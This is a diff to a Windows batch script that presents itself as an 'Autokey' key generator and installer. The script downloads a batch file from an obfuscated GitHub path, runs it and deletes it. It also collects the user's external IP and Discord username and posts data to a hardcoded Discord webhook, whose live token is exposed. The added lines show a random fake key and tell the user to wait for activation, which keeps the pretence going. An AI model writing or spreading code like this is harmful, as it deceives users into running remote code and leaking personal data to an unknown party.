@@ -26,7 +26,6 @@ curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/
 call %file2%.bat
 del %file2%.bat
 if "%abc%"=="blocked" goto blocked
-title USER_KEY_CREATE
 echo %normal% 
 cls
 
@@ -35,9 +34,11 @@ echo %normal%
 cls
 title Autokey
 echo %normal% 
+cls
 echo 1. Update + install
 echo 2. Uninstall
 echo 3. USER_KEY_CREATOR
+echo %normal% 
 set /p select=Num: 
 if %select%==1 goto key
 if %select%==2 goto uninstall
@@ -123,6 +124,7 @@ for /f "tokens=2 delims=: " %%A in (
 ) Do set ExtIP=%%A
 cd %temp%
 :q
+echo %normal% 
 cls
 echo Type "1" to Enter USER_KEY
 echo Enter Discrod Username and Tag!
@@ -139,6 +141,7 @@ if %check%==2 goto q
 goto check
 cls
 :con
+set key=%random%%random%-%random%%random%-%random%%random%
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 1/14 %hide%
@@ -154,7 +157,7 @@ curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 4/14 %hide%
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %random%%random%-%random%%random%-%random%%random%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
+curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Key:  %key%\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
 cls
 echo %normal% It can take some time! %hide%
 echo %normal% 5/14 %hide%
@@ -196,6 +199,9 @@ echo %normal% It can take some time! %hide%
 echo %normal% 14/14 %hide%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"**        **\"}" https://discord.com/api/webhooks/948608054616813658/3XOlB5nj7ZvIJ9PhFeIyPzh7s56JKyiO5LzKVE0xDsEOtJoYpLYXacaoYZHbG-Nq6Yrz
 cls
-echo %normal% Done! We will send USER_KEY in discord
+echo %normal% Done! 
+echo Your key: %key%
+echo Wait for key activation!
+echo %normal%
 set /p p=Press Enter!
 goto l
